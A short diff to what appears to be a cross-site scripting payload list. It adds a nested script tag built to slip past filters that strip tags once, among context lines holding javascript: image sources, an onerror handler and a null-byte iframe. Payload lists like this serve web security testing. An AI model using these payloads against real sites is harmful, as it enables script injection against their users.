@@ -18,7 +18,7 @@
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 <IMG SRC=javascript:alert(‘XSS’)>      
 <img src=xss onerror=alert(1)>
-
+<sCri<script>pt>alert(1)</sCri</script>pt>
 
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 
